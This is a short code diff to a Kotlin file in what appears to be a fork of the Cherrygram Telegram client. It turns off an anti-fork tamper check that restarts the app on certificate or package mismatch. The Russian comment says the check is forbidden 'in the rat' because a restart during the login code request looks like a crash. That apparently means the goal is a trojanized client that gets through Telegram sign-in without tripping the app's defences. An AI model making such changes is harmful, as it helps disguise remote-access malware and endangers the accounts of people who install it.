@@ -185,8 +185,13 @@ object KotlinFragmentsManager {
     }
 
     fun nfweioufwehr117() {
-//        exitProcess(0)
-        AppRestartHelper.restartApp(ApplicationLoader.applicationContext)
+        // 🚀✨ XXL: это рубильник анти-форковой машины Арслана (несовпадение сертификата /
+        // имени пакета / названия приложения / «чужих» классов → рестарт процесса).
+        // В крысе он запрещён: перезапуск прямо во время auth.sendCode выглядит как краш.
+        // Политика lives в XXLVibeTamperDetectorCore.shouldRestart (по умолчанию false).
+        if (uz.unnarsx.cherrygram.xxl.tamper.core.XXLVibeTamperDetectorCore.shouldRestart(detected = true)) {
+            AppRestartHelper.restartApp(ApplicationLoader.applicationContext)
+        }
     }
 
     suspend fun iooewwfueuewu121(messageObject: MessageObject?) {
